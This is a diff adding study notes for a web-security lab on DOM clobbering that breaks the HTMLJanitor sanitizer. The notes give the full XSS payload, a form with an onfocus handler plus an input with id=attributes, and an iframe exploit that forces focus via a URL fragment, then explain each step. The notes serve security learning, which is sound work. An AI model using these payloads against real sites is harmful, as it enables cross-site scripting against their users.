@@ -3204,3 +3204,317 @@ implicit window properties
 ## 🎯 Final Easy Understanding
 
 DOM clobbering tricks the browser into turning attacker HTML into fake JavaScript objects. The website accidentally trusts those fake objects and uses attacker-controlled values in dangerous places, leading to XSS.
+
+---
+
+# 🧠Lab-7 DOM Clobbering to Break HTMLJanitor Sanitization
+
+---
+
+## 📝 Overview
+
+This lab is about DOM clobbering breaking an HTML sanitizer (`HTMLJanitor`) to bypass filtering and trigger XSS via `onfocus`.
+
+Core idea:
+
+Sanitizer depends on `element.attributes`
+        ↓
+Attacker overwrites `attributes` using DOM clobbering
+        ↓
+Sanitizer logic breaks
+        ↓
+Malicious attribute survives (`onfocus`)
+        ↓
+Browser triggers event → `print()`
+
+---
+
+## 🧭 What Is This Topic?
+
+• DOM Clobbering
+
+• HTMLJanitor (client-side HTML filter)
+
+• Attribute-based sanitization bypass
+
+• Event-driven XSS (`onfocus`)
+
+• Exploit server forced interaction
+
+---
+
+# 🔄 Lab Walkthrough
+
+---
+
+## 📝 Step 1 — Inject Malicious Comment
+
+Go to a blog post and submit:
+
+```html
+<form id=x tabindex=0 onfocus=print()>
+  <input id=attributes>
+```
+
+---
+
+## 🧠 Step 2 — Understand Payload Components
+
+### ⚠️ 1. Form Element
+
+```html
+<form id=x tabindex=0 onfocus=print()>
+```
+
+• `id=x` → used for targeting (`#x`)
+
+• `tabindex=0` → makes it focusable
+
+• `onfocus=print()` → XSS trigger when focused
+
+---
+
+### ⚠️ 2. Input Element (Clobbering Trick)
+
+```html
+<input id=attributes>
+```
+
+This is the DOM clobbering vector.
+
+It overwrites:
+
+```js
+element.attributes
+```
+
+---
+
+# ⚠️ Normal Behavior vs Malicious Behavior
+
+---
+
+## 📝 Normal
+
+```js
+element.attributes
+```
+
+→ real attribute list
+
+Example:
+
+```txt
+id
+tabindex
+onfocus
+```
+
+Filter loops safely.
+
+---
+
+## 📝 Malicious
+
+```html
+<input id=attributes>
+```
+
+Now:
+
+```js
+element.attributes → <input element>
+```
+
+So:
+
+```js
+attributes.length = undefined
+```
+
+---
+
+## ⚠️ What Breaks in Filter
+
+HTMLJanitor does:
+
+```js
+for(i=0; i < element.attributes.length; i++)
+```
+
+But now:
+
+```js
+length = undefined
+```
+
+So loop fails immediately.
+
+👉 Sanitizer stops working correctly.
+
+---
+
+## ⚠️ Result of Failure
+
+Filter does NOT remove:
+
+```html
+onfocus=print()
+```
+
+---
+
+## 📝 Step 3 — Exploit Server Payload
+
+```html
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/post?postId=3"
+onload="setTimeout(()=>this.src=this.src+'#x',500)">
+```
+
+---
+
+## 🧠 What This Does
+
+### ⚠️ 1. Loads blog page
+
+iframe loads victim page
+
+---
+
+### ⚠️ 2. Delay execution
+
+```js
+setTimeout(..., 500)
+```
+
+Purpose:
+
+• wait for comment to load
+
+• ensure DOM is ready
+
+---
+
+### ⚠️ 3. Adds fragment #x
+
+```txt
+#x
+```
+
+This tells browser:
+
+👉 focus element with `id="x"`
+
+---
+
+## 📝 Step 4 — Browser Behavior
+
+Browser finds:
+
+```html
+<form id=x tabindex=0 onfocus=print()>
+```
+
+Then automatically focuses it.
+
+---
+
+## 📝 Step 5 — XSS Trigger
+
+Focus event runs:
+
+```js
+print()
+```
+
+---
+
+# 🔗 Full Attack Chain
+
+Inject form + input(id=attributes)
+        ↓
+HTMLJanitor tries sanitization
+        ↓
+attributes gets clobbered
+        ↓
+filter loop breaks
+        ↓
+onfocus survives filtering
+        ↓
+iframe loads blog page
+        ↓
+#x triggers focus
+        ↓
+onfocus executes
+        ↓
+print() runs
+
+---
+
+# 🧠 Key Concepts
+
+---
+
+## ⚠️ 1. What is DOM Clobbering here?
+
+Replacing real `attributes` object with a fake DOM node
+
+---
+
+## ⚠️ 2. Why input id=attributes?
+
+Because sanitizer depends on:
+
+```js
+element.attributes
+```
+
+We overwrite it to break logic.
+
+---
+
+## ⚠️ 3. Why tabindex=0?
+
+Makes element:
+
+```txt
+focusable via JavaScript / fragment navigation
+```
+
+---
+
+## ⚠️ 4. Why #x?
+
+Triggers browser focus behavior:
+
+```txt
+URL fragment → focus element with id=x
+```
+
+---
+
+## ⚠️ 5. Why setTimeout?
+
+Ensures:
+
+• comment is loaded first
+
+• then trigger focus safely
+
+---
+
+# 🌍 Real-Life Analogy
+
+Security guard checks checklist before letting people in
+        ↓
+Attacker replaces checklist with broken paper
+        ↓
+Guard can’t verify anything
+        ↓
+Dangerous person passes through
+
+---
+
+# 🎯 Final Mental Model
+
+DOM clobbering breaks sanitizer’s dependency on `attributes`, causing the filter to stop working and allowing event-based XSS via focus triggering.
